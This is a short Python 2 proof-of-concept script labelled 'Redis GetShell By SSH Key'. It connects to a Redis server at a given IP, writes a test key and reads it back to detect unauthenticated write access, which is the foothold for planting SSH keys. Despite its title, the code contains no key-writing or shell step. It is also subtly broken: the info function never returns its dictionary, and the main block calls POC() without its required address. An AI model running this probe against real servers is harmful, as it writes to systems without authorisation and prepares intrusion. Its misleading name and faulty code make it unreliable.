#coding=utf-8
import redis

def POC_INFO():
	dict_poc={};
	dict_poc["name"]="Redis GetShell By SSH Key"
	dict_poc["Chineses_name"]="Redis利用写公钥拿权限"
	dict_poc["author"]="跳跳龙"
	dict_poc["port"]=6379
	
def POC(ip,port=6379):
	try:
		pool=redis.ConnectionPool(host=ip,port=port,decode_responses=True)
		r=redis.Redis(connection_pool=pool)
		if r:
			r.set("abcdefgqwertyuiop","ABCDEFGQWERTYUIOP")
			if(r.get("abcdefgqwertyuiop")=="ABCDEFGQWERTYUIOP"):
				return True
			else:
				return False
	except:
		return False

if __name__ == '__main__':
	print POC()